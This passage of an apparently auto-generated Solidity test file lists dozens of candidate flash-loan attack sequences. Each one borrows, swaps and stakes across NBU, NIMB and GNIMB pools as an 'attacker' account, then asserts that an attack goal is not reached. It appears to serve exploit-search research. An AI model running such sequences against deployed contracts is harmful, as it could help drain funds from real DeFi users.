        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5244(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5245(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5246(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5247(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5248(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5249(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5250(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5251(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5252(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5253(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5254(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5255(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5256(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5257(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5258(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5259(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5260(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5261(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5262(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5263(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5264(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5265(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5266(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5267(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5268(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5269(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5270(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5271(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5272(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5273(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5274(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5275(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5276(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5277(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5278(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5279(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5280(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5281(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5282(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5283(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5284(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5285(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5286(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5287(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5288(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5289(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
